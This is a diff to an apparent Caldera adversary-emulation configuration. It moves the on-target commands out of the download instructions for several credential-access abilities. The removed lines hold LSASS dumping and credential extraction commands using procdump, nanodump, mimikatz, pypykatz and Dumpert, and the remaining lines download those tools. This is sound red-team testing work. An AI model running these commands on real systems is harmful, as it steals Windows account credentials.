@@ -44,7 +44,7 @@
             "singleton": false,
             "plugin": "atomic",
             "delete_payload": true,
-            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: ProcDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsystemctl restart caldera\n\nCommand (runs on target):\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp"
+            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: ProcDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsystemctl restart caldera"
           },
           {
             "ability_id": "82dcefb5c3512d73bf2248cb0127c4ae",
@@ -231,7 +231,7 @@
             "singleton": false,
             "plugin": "atomic",
             "delete_payload": true,
-            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: pypykatz (Python venv)\npip3 install pypykatz && cp -r $(python3 -c \"import pypykatz, os; print(os.path.dirname(pypykatz.__file__))\") ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz && systemctl restart caldera\n\n# Target prerequisite: Python 3 must be installed on the Windows target\n# If not installed, run on target:\n#   invoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"ExternalPayloads\\python_setup.exe\"\n#   Start-Process -FilePath \"ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n\nCommand (runs on target):\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\" live lsa"
+            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: pypykatz (Python venv)\npip3 install pypykatz && cp -r $(python3 -c \"import pypykatz, os; print(os.path.dirname(pypykatz.__file__))\") ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/pypykatz && systemctl restart caldera\n\n# Target prerequisite: Python 3 must be installed on the Windows target\n# If not installed, run on target:\n#   invoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"ExternalPayloads\\python_setup.exe\"\n#   Start-Process -FilePath \"ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait"
           },
           {
             "ability_id": "60bb6f8468aa98b75be2521861a164d5",
@@ -320,7 +320,7 @@
             "singleton": false,
             "plugin": "atomic",
             "delete_payload": true,
-            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: NanoDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -O ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && \\\nsystemctl restart caldera\n\nCommand (runs on target):\nPathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"%temp%\\SilentProcessExit\""
+            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: NanoDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -O ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && \\\nsystemctl restart caldera"
           },
           {
             "ability_id": "54643bf2018c940ca5fc21097884d2d4",
@@ -359,7 +359,7 @@
             "singleton": false,
             "plugin": "atomic",
             "delete_payload": true,
-            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: ProcDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsystemctl restart caldera\n\nCommand (runs on target):\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe\" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp"
+            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: ProcDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://download.sysinternals.com/files/Procdump.zip\" -O /tmp/Procdump.zip && \\\nunzip -o /tmp/Procdump.zip -d /tmp/Procdump && \\\ncp /tmp/Procdump/procdump64.exe ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/procdump.exe && \\\nrm -rf /tmp/Procdump.zip /tmp/Procdump && \\\nsystemctl restart caldera"
           },
           {
             "ability_id": "990a4629d154622098b70ba50384051f",
@@ -398,7 +398,7 @@
             "singleton": false,
             "plugin": "atomic",
             "delete_payload": true,
-            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: NanoDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -O ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && \\\nsystemctl restart caldera\n\nCommand (runs on target):\nPathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\""
+            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: NanoDump\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -O ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/nanodump.x64.exe && \\\nsystemctl restart caldera"
           },
           {
             "ability_id": "7e8ccbe3de961012b6464485829e87a4",
@@ -435,7 +435,7 @@
             "singleton": false,
             "plugin": "atomic",
             "delete_payload": true,
-            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: Mimikatz\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && \\\nwget -q \"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\" -O /tmp/mimikatz.zip && \\\nunzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && \\\ncp /tmp/mimikatz/x64/mimikatz.exe ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe && \\\nrm -rf /tmp/mimikatz.zip /tmp/mimikatz && \\\nsystemctl restart caldera\n\nCommand (runs on target):\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe\" \"sekurlsa::minidump %tmp%\\lsass.DMP\" \"sekurlsa::logonpasswords full\" exit"
+            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: Mimikatz\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && \\\nwget -q \"https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip\" -O /tmp/mimikatz.zip && \\\nunzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && \\\ncp /tmp/mimikatz/x64/mimikatz.exe ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe && \\\nrm -rf /tmp/mimikatz.zip /tmp/mimikatz && \\\nsystemctl restart caldera"
           },
           {
             "ability_id": "03455985e8bf5d2ee43947cadaca2256",
@@ -474,7 +474,7 @@
             "singleton": false,
             "plugin": "atomic",
             "delete_payload": true,
-            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: Outflank Dumpert\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -O ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe && \\\nsystemctl restart caldera\n\nCommand (runs on target):\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""
+            "download_instructions": "Prerequisites (Manual Step Required)\n\nThis ability requires an external payload that must be manually staged on the Caldera server before execution.\n\nPayload: Outflank Dumpert\nmkdir -p ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads && \\\nwget -q \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -O ~/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/Outflank-Dumpert.exe && \\\nsystemctl restart caldera"
           },
           {
             "ability_id": "8e01631039faf6a9a84df376bf9ad0f1",
